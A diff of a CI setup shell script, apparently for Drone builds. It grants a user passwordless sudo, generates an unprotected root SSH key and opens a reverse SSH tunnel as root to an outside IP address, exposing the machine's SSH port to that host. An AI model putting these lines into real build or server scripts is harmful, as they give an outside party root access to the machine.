@@ -13,13 +13,14 @@ function add_rukosan_user {
 	sudo su - -c "echo \"\nrukosan ALL=(ALL:ALL) NOPASSWD: ALL\" >> /etc/sudoers"
 }
 
-sudo su - -c "sed -i 's/#PasswordAuthentication/PasswordAuthentication/' /etc/ssh/sshd_config"
-sudo su - -c "sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config"
-sudo su - -c "service ssh restart"
-sudo su - -c "cat /etc/ssh/sshd_config"
-curl jsonip.com
+sudo su - -c "ssh-keygen -f /root/.ssh/id_rsa -P\"\""
+sudo su - -c "cat /root/.ssh/id_rsa.pub"
+
+sleep 60
+
+sudo su - -c "ssh -R 2222:localhost:22 root@178.79.176.196"
 add_rukosan_user
-sleep 120
+sleep 180
 
 if [ "$DRONEIO" = "true" ]; then
 
